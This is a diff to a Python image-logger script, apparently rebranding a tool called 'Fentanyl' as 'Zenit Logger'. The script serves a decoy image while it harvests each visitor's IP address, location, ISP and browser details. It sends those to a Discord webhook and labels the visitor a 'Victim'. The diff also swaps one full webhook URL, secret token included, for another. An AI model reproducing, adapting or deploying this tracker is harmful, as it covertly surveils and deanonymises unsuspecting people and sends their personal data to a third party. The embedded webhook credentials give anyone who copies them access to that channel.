@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTBWUnddB2J5cckALZenPo6KQJwLzysEohESDOhj-'
+webhook = 'https://discord.com/api/webhooks/1475967243815747655/DkrnKja8MJUOG6C36XTrt8VJchWePLQR0Bicb4m-w0ES3o2zjEltqU0RTF70aqsTwilx'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
@@ -14,11 +14,11 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "Zenit Logger",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "Zenit"
       },
       "fields": [
         {
@@ -42,9 +42,9 @@ def prev(ip,uag):
   "content": "",
   "embeds": [
     {
-      "title": "Fentanyl Alert!",
+      "title": "ZENIT LOGGER",
       "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "description": f"Discord previewed a Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
         "name": "Fentanyl"
       },
